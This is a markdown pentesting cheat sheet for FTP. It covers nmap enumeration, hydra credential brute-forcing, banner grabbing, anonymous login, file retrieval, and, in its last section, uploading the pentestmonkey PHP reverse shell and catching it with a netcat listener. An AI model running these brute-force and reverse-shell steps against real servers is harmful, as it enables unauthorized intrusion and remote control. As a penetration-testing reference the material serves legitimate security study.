---
title: File Transfer Protocol (FTP) Pentesting
description: It is a standard communication protocol used for the transfer of computer files from a server to a client on a computer network. Default ports are 20, 21.
tags:
    - Network
    - Reverse Shell
draft: false
---

## Enumeration

- **Nmap**

    ```sh
    nmap --script ftp-anon -p 21 <target-ip>
    nmap --script ftp-vuln* -p 21 <target-ip>
    nmap --script ftp-* -p 21 <target-ip>
    ```

- **Brute Force Credentials**

    ```sh
    hydra -l username -P passwords.txt <target-ip> ftp
    hydra -L username.txt -p password <target-ip> ftp

    hydra -l username -P passwords.txt ftp://<target-ip>
    hydra -L usernames.txt -p password ftp://<target-ip>
    ```

<br />

## Investigation

- **Banner Grabbing**

    ```sh
    nc <target-ip> 21
    ```

    - **OpenSSL**

        First off, open listener.

        ```sh
        nc -vn <target-ip> 21
        ```

        Then run the command below.

        ```sh
        openssl s_client -connect <target-ip>:21 -starttls ftp
        ```

<br />

## Connect FTP

```sh
ftp username@10.0.0.1
```

Sometimes you might be able to the **anonymous** login.  
Not likely, but worth a try.

```
ftp 10.0.0.1 
username: anonymous
password: anonymous
```

<br />

## Operations in FTP

If you can connect FTP, search directories and files, then download them to your local machine.

- **Investigation**


    ```sh
    ftp> pwd
    ftp> cd
    ftp> ls
    ```

- **Transfer Files**

    To transfer files to local machine,

    ```sh
    ftp> get sample.txt

    # recursive
    wget -r --user='username' --password='password' ftp://<target-ip>/sample
    ```

<br />

## Reverse Shell over FTP

If the target website allows users to access the ftp directory, you can upload the exploit for the reverse shell and get a shell.  

1. **Download the Payload**

    Get the payload for the reverse shell from [this repository](https://github.com/pentestmonkey/php-reverse-shell).

    ```sh
    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

    # Edit some variables
    $ip = '<your-local-ip>';
    $port = 1234;
    ```

2. **Upload the Payload to FTP Directory**

    Connect to FTP and upload.

    ```sh
    ftp username@<target-ip>

    # Upload the payload you downloaded
    ftp > put shell.php
    ```

3. **Get a Shell**

    At first, you need to open listener in your local machine.

    ```sh
    nc -lvnp 1234
    ```

    In a web browser, access to "http://vulnerable.com/path/to/ftp/shell.php".  
    You should get a target shell.
